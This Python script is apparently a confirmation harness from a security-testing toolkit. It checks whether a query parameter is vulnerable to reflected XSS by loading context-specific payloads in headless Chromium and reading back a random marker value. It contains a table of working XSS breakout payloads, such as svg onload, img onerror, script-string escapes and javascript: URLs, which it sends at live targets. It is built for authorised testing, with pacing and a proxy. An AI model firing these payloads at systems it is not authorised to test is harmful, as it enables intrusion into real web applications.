#!/usr/bin/env python3
"""
xss-confirm.py — the reflected XSS oracle (Grimnir confirmation harness).

Reflected XSS is proven by execution, not by reflection: a headless browser loads the payload URL
and the payload must set a random number the page itself could never set.

  xss-confirm.py --finding-id SPE-009 --project-dir ~/workspace/prog \
     --method GET --url 'https://host/search?q=a' --param q [-H 'Name: value']...

  1. map      one GET whose value tags each of ' " < > ` with its own canary (params.py's breaker):
              where the value comes back (HTML text, attribute, script, comment), which characters
              come back raw, and whether the response is HTML at all
  2. choose   the payloads that context allows with the characters that came back raw, most
              reliable first (break out of the tag, then an autofocus handler, then a script string)
  3. execute  load each (at most two) in headless Chromium. Only the main document is fetched:
              every other request (scripts, images, a redirect) is aborted, so the target sees one
              request per load, and an <img> error handler still fires. The payload sets
              window.__grimnir_xss to a fresh random number; reading that number back is the proof.

Verdicts (evidence/<id>/render.json + render.png, the files validate-finding.sh's gate reads for xss):
  confirmed     the browser ran the payload: window.__grimnir_xss holds this run's number
  xss-likely    the payload came back intact but didn't run (a CSP, a DOM sanitizer, or a context
                that needs a click such as a javascript: URL), or no browser is available here
  negative      not an HTML response, the context's characters come back encoded, or the payload
                came back altered
  inconclusive  transport failure, or the parameter isn't reflected

The payload only sets a variable in our own browser: nothing is stored, sent, or shown to anyone else.
"""
import argparse
import json
import os
import secrets
import sys
from datetime import datetime, timezone

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import _pace  # noqa: E402  RoE pacing around every live request (sibling module; puts scripts/ on the path)
import params as _params  # noqa: E402  breaker map, reflection contexts, and the probe's fetch
import egress as _egress  # noqa: E402  the program's egress proxy: requests and the browser ride it

MARK = "window.__grimnir_xss"
# context -> [(raw characters it needs, template with X for the marker statement)], best first.
PAYLOADS = {
    "html-text": [("<>", "<svg onload=X>"), ("<", "<img src=x onerror=X ")],
    "comment": [("<>", "--><svg onload=X>")],
    "attribute-dq": [('"<>', '"><svg onload=X>'), ('"', '" autofocus onfocus=X x="')],
    "attribute-sq": [("'<>", "'><svg onload=X>"), ("'", "' autofocus onfocus=X x='")],
    "attribute-unquoted": [("<>", "><svg onload=X>"), ("", " autofocus onfocus=X x=")],
    "attribute-url": [("", "javascript:X")],
    "script": [("<>", "</script><svg onload=X>"), ("'", "'-X-'"), ('"', '"-X-"'), ("`", "${X}")],
}
NEEDS_CLICK = {"attribute-url"}
MAX_LOADS = 2


def payloads_for(contexts: list[str], raw: list[str]) -> list[tuple[str, str]]:
    """(context, template) for every payload a reflected context allows, best first."""
    out = []
    for ctx in contexts:
        for needs, tpl in PAYLOADS.get(ctx, ()):
            if set(needs) <= set(raw):
                out.append((ctx, tpl))
    return out


def arm(tpl: str, nonce: int) -> str:
    return tpl.replace("X", f"({MARK}={nonce})")


def probe_xss(get, render, url: str, param: str) -> dict:
    """The whole oracle against one parameter. `get(url) -> {status, body, headers, content_type}`
    sends one paced GET; `render(url) -> {status, body, value, csp, screenshot, error}` loads it in
    the browser (one paced request). Returns the evidence record minus the run metadata."""
    out: dict = {"requests": 0, "contexts": [], "raw_chars": [], "attempts": []}
    canary = _params.new_canary()
    r = get(_params.with_param(url, param, _params.breaker_value(canary)))
    out["requests"] += 1
    if not r.get("status"):
        return {**out, "verdict": "inconclusive", "why": "map request failed (transport error)"}
    body, headers = r.get("body") or "", r.get("headers") or {}
    ctype = r.get("content_type") or headers.get("Content-Type", "")
    out["contexts"] = _params.reflections(body, headers, ctype, canary)
    out["raw_chars"], _ = _params.raw_breakers(body, headers, canary)
    if not out["contexts"]:
        return {**out, "verdict": "inconclusive", "why": "parameter not reflected in the response"}
    if _params.body_kind(ctype, body) != "html":
        return {**out, "verdict": "negative",
                "why": f"reflected, but the response is not HTML ({ctype or 'no content type'}): a browser won't run it"}
    choices = payloads_for(out["contexts"], out["raw_chars"])
    if not choices:
        return {**out, "verdict": "negative",
                "why": f"reflected in {', '.join(out['contexts'])}, but the characters those contexts "
                       f"need come back encoded (raw: {''.join(out['raw_chars']) or 'none'})"}

    intact_any, why_not = False, ""
    for ctx, tpl in choices[:MAX_LOADS]:
        nonce = 100000000 + secrets.randbelow(900000000)
        payload = arm(tpl, nonce)
        u = _params.with_param(url, param, payload)
        rr = render(u)
        out["requests"] += 1
        intact = payload in (rr.get("body") or "")
        att = {"context": ctx, "payload": payload, "url": u, "status": rr.get("status", 0),
               "intact": intact, "executed": rr.get("value") == nonce}
        for k in ("csp", "error", "screenshot"):
            if rr.get(k):
                att[k] = rr[k]
        out["attempts"].append(att)
        if att["executed"]:
            out.update(screenshot=rr.get("screenshot"), poc_url=u, context=ctx, payload=payload, executed=True)
            return {**out, "verdict": "confirmed",
                    "why": f"the browser ran the payload reflected in {ctx}: {MARK} held this run's number"}
        if intact:
            intact_any = True
            why_not = ("the context needs a click (javascript: URL)" if ctx in NEEDS_CLICK else
                       "a Content-Security-Policy is set" if rr.get("csp") else
                       f"browser unavailable: {rr['error']}" if rr.get("error") else
                       "it may need interaction or a DOM sanitizer removed it")
    out["executed"] = False
    if intact_any:
        return {**out, "verdict": "xss-likely",
                "why": f"the payload came back intact but did not run; {why_not}"}
    return {**out, "verdict": "negative", "why": "the payload came back altered (filtered on the way back)"}


_ANNOTATE = f"""() => {{
  const d = document.createElement('div');
  d.textContent = 'Grimnir harness annotation (drawn after the check, not by the payload): ' +
    'the reflected payload set {MARK} = ' + {MARK} + ' on origin ' + location.origin;
  d.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;padding:8px;' +
    'background:#fff3cd;color:#000;border-bottom:2px solid #c00;font:14px monospace';
  (document.body || document.documentElement).appendChild(d);
}}"""


def browser_render(url: str, headers: list[str], timeout: float, shot: str, wait: float = 1.5,
                   proxy: dict | None = None) -> dict:
    """Load `url` in headless Chromium, fetching only the main document, via `proxy` when one is
    configured (egress.playwright_proxy)."""
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        r = _params.fetch(url, headers, timeout)
        return {**r, "value": None, "error": "playwright not installed"}
    extra = {}
    for line in headers:
        if ":" in line:
            k, v = line.split(":", 1)
            extra[k.strip()] = v.strip()
    ua = next((v for k, v in extra.items() if k.lower() == "user-agent"), _params.DEFAULT_UA)
    extra = {k: v for k, v in extra.items() if k.lower() != "user-agent"}
    out = {"status": 0, "body": "", "value": None, "csp": "", "screenshot": "", "error": ""}
    with sync_playwright() as p:
        b = p.chromium.launch(headless=True, proxy=proxy)
        try:
            ctx = b.new_context(user_agent=ua, extra_http_headers=extra)
            page = ctx.new_page()
            state = {"main": False}

            def route(rt):
                req = rt.request
                if not state["main"] and req.is_navigation_request() and req.frame == page.main_frame:
                    state["main"] = True
                    rt.continue_()
                else:
                    rt.abort()
            page.route("**/*", route)
            resp = page.goto(url, wait_until="load", timeout=int(timeout * 1000))
            if resp is not None:
                out["status"] = resp.status
                out["csp"] = resp.headers.get("content-security-policy", "")
                try:
                    out["body"] = resp.text()
                except Exception:  # noqa: BLE001
                    out["body"] = ""
            page.wait_for_timeout(int(wait * 1000))
            out["value"] = page.evaluate(f"typeof {MARK} === 'undefined' ? null : {MARK}")
            if out["value"] is not None:
                # Label the screenshot with what was read back. Drawn by the harness after the fact
                # and says so, so it is never mistaken for the payload's own output.
                page.evaluate(_ANNOTATE)
            page.screenshot(path=shot, full_page=True)
            out["screenshot"] = shot
        except Exception as e:  # noqa: BLE001
            out["error"] = str(e)[:300]
        finally:
            b.close()
    return out


def main() -> int:
    ap = argparse.ArgumentParser(prog="xss-confirm.py")
    ap.add_argument("--finding-id", required=True)
    ap.add_argument("--project-dir", required=True)
    ap.add_argument("--method", default="GET")
    ap.add_argument("--url", required=True, help="a concrete URL that carries (or accepts) the parameter")
    ap.add_argument("--param", required=True, help="the query parameter to inject")
    ap.add_argument("-H", "--header", action="append", default=[], dest="headers")
    ap.add_argument("--timeout", type=float, default=20.0)
    a = ap.parse_args()
    if a.method.upper() != "GET":
        print("xss-confirm.py probes GET query parameters only (reflected XSS)", file=sys.stderr)
        return 2
    _pace.init(a.project_dir)
    _egress.init(a.project_dir)   # roe.json's proxy applies to a CLI run, not just a lane's env
    pw_proxy = _egress.playwright_proxy(_egress.proxy())   # raises on an unusable proxy: fail closed
    d = os.path.join(a.project_dir, "evidence", a.finding_id)
    os.makedirs(d, exist_ok=True)

    def get(u):
        _pace.before(u)
        r = _params.fetch(u, a.headers, a.timeout)
        if r.get("status"):
            _pace.after(u, r["status"])
        return r

    def render(u):
        _pace.before(u)
        r = browser_render(u, a.headers, a.timeout, os.path.join(d, "render.png"), proxy=pw_proxy)
        if r.get("status"):
            _pace.after(u, r["status"])
        return r

    res = probe_xss(get, render, a.url, a.param)
    rec = {"schema": 1, "finding_id": a.finding_id, "vuln_class": "xss",
           "ts": datetime.now(timezone.utc).isoformat(), "url": a.url, "param": a.param,
           "screenshot": res.get("screenshot") or "", **res,
           "negative_control": ("execution read back as this run's random number from a browser that "
                                f"fetched only the main document: {res['why']}")}
    with open(os.path.join(d, "render.json"), "w") as fh:
        json.dump(rec, fh, indent=2)
    print(json.dumps({k: rec[k] for k in ("finding_id", "verdict", "why")}, indent=2))
    print(f"wrote {d}/render.json ({res['requests']} requests)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
